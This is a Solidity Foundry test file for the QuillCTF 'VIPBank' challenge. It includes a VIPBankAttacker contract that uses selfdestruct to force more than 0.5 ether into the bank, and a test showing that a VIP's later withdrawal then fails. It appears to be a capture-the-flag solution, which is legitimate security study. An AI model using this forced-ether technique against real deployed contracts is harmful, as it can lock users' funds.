// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/VIPBank/VIPBank.sol";

contract VIPBankTest is Test {
    VIPBank public vipBank;
    VIPBankAttacker public attacker;
    address public deployer;
    address public vip;

    function setUp() public {
        deployer = vm.addr(1);
        vip = vm.addr(2);

        vm.startPrank(deployer);
        vm.deal(deployer, 1 ether);

        vipBank = new VIPBank();
        attacker = new VIPBankAttacker{value: 0.51 ether}(
            payable(address(vipBank))
        );

        vm.stopPrank();
    }

    function testFail_WithDraw() public {
        vm.startPrank(deployer);
        vipBank.addVIP(vip);
        vm.stopPrank();

        vm.startPrank(vip);
        vipBank.deposit{value: 0.01 ether}();

        vipBank.withdraw(0.01 ether);
        vm.stopPrank();
    }
}

contract VIPBankAttacker {
    constructor(address payable targetAddr) payable {
        require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");
        selfdestruct(targetAddr);
    }
}
